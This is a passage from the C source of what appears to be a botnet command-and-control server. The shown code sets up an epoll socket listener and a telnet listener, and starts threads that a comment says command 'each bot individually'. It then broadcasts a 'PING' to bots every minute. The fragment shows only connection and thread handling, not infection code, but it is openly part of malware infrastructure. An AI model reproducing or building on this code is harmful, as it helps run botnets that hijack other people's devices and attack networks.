                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "GOOGLE V2");
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}